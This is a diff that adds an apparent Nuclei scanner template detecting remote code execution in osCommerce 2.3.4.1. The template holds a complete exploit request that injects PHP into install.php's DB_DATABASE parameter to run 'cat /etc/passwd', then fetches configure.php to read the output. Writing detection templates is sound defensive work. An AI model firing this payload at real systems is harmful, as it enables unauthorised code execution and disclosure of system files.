@@ -1,0 +1,37 @@
+id: oscommerce-rce
+
+info:
+  name: osCommerce 2.3.4.1 - Remote Code Execution
+  author: Suman_Kar
+  severity: high
+  description: A vulnerability in osCommerce's install.php allows remote unauthenticated attackers to injecting PHP code into the db_database parameter, and subsequently use the configure.php page to to read the
+    command's executed output
+  reference:
+    - https://www.exploit-db.com/exploits/50128
+  tags: rce,oscommerce
+
+requests:
+  - raw:
+      - |
+        POST /install/install.php?step=4 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded
+
+        DIR_FS_DOCUMENT_ROOT=.%2F&DB_DATABASE=%27%29%3Bpassthru%28%27cat+%2Fetc%2Fpasswd%27%29%3B%2F%2A
+
+      - |
+        GET /install/includes/configure.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        part: body
+
+      - type: status
+        status:
+          - 200
